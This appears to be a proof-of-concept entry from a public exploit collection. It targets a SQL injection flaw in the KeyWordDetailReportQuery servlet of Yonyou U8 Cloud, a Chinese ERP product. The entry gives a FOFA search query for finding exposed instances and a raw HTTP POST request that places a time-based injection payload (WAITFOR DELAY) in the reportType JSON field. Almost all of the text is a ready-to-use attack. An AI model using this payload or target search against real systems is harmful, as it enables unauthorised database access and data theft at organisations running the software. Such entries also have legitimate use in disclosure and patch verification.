# 用友U8_cloud_KeyWordDetailReportQuery_SQL注入漏洞

## fofa
```
app="用友U8 Cloud"
```

## poc
```
POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery  HTTP/1.1
host:127.0.0.1

{"reportType":"';WAITFOR DELAY '0:0:5'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}
```

![19d957a16fb12f9edddbd99a2dbd081a](https://github.com/wy876/POC/assets/139549762/dfc8e10e-b1f8-41db-8dd2-e23c5c47b249)
